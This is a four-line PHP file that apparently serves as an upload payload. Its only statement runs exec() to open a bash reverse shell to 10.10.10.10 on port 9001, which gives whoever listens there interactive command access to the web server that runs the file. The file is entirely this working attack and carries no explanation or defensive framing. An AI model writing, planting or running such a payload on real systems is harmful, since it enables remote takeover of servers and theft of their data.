<?php

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10 9001 0>&1'");

?>
